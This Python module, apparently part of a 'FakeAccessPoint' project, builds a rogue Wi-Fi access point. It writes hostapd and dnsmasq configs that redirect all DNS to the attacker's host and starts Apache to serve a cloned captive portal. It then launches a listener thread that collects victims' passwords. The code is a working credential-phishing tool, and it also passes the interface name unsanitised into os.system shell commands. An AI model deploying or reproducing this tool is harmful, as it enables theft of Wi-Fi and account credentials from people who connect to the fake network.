import os
from threading import Thread
from string import Template

from dbus import Interface
from FakeAccessPoint.password_handler import start_listen

def create_fake_access_point(SSID,interface):
    """
    prepare the environment setup for creating the fake access point.
    """
    create_config_files(SSID,interface) 
    os.system('sudo sh FakeAccessPoint/scripts/openAP.sh') 
    
    # we will configure our interface to have an IP address of 10.0.0.1
    """ The reason we use 10.0.0.1 is because this is the ip address that is used by the dnsmasq.conf
    and all the requests is configured to go to this IP.
    Here, 255.255.255.0 address is the most common subnet mask used on computers 
    connected to Internet Protocol (IPv4) networks.
    In our case the format would be 10.0.0.xxx,
    where xxx will be the only part that would vary for every IP address in that network.
    Likewise if the subnet mask is 255.255.0.0 then the computer would assume
    that every IP address in that netwrok would be in the format of 10.0.xxx.xxx.) """
    os.system("ifconfig " +interface+ " 10.0.0.1 netmask 255.255.255.0")
    
    # Start Web server to launch the cloned captive portal.
    # Hence, when the client clicks on the fake AP the captive portal web page is displayed.
    os.system("service apache2 start")
    print('The fake access point: {} '.format(SSID))
    listen_thread = Thread(target=start_listen, daemon=True)
    listen_thread.start()


def create_config_files(SSID,interface):
    """
    create dnsmasq and hostapd config files
    """
    # we will configure hostapd to start fake AP, in order to allow people to connect to it
    with open('FakeAccessPoint/configs/hostapd.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("ssid="+SSID+"\n")
        f.write("channel=1\n")
        f.write("driver=nl80211\n")
        
    # we will configure dnsmasq to be used as a DHCP server and DNS server.
    with open('FakeAccessPoint/configs/dnsmasq.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("bind-interfaces\n")
        f.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
        f.write("dhcp-option=3,10.0.0.1\n") #Set the gateway IP address
        f.write("dhcp-option=6,10.0.0.1\n") #Set dns server address
        f.write("address=/#/10.0.0.1\n") #Redirect all requests to 10.0.0.1

    

    
